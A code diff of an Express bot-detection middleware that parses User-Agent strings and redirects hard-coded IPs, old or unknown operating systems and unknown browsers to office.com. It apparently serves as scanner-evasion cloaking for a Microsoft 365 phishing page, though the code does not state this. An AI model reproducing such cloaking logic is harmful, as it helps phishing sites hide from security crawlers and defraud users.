@@ -48,15 +48,23 @@ function isBotRef(referer) {
 }
 
 // Combined Bot detection middleware
-const redirectUrl = "https://office.com"; // Define the redirection link
+const UAParser = require('ua-parser-js');
 
 const detectBotMiddleware = (req, res, next) => {
     const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
     const userAgent = req.headers['user-agent'] || "Unknown User-Agent";
-    const os = req.headers['os'] || "Unknown OS Platform"; // Replace with actual OS detection logic
-    const browser = req.headers['browser'] || "Unknown Browser"; // Replace with actual browser detection logic
 
-    // Specific IP, OS, and browser checks
+    // Parse the User-Agent string
+    const parser = new UAParser();
+    const uaResult = parser.setUA(userAgent).getResult();
+
+    // Extract OS and browser information
+    const os = uaResult.os.name || "Unknown OS Platform";
+    const browser = uaResult.browser.name || "Unknown Browser";
+
+    console.log(`Detected IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
+
+    // Your blocking logic
     if (
         ip === "92.23.57.168" ||
         ip === "96.31.1.4" ||
@@ -70,22 +78,11 @@ const detectBotMiddleware = (req, res, next) => {
         os === "Windows 2000" ||
         os === "Unknown OS Platform" ||
         browser === "Unknown Browser"
-    ) {
-        console.log(`Blocked by OS/Browser: IP: ${ip}, OS: ${os}, Browser: ${browser}, User-Agent: ${userAgent}`);
-        return res.redirect(redirectUrl);
+    ){
+        console.log(`Blocked request: IP: ${ip}, OS: ${os}, Browser: ${browser}`);
+        return res.redirect("https://office.com");
     }
 
-    // Generic bot detection (using isBotUA, isBotIP, and other methods)
-    if (
-        isBotUA(userAgent) ||
-        isBotIP(ip) ||
-        isBotRef(req.headers.referer || req.headers.origin)
-    ) {
-        console.log(`Blocked request: IP: ${ip}, User-Agent: ${userAgent}`);
-        return res.status(403).send('Access denied');
-    }
-
-    // If no conditions are met, proceed to the next middleware
     next();
 };
 
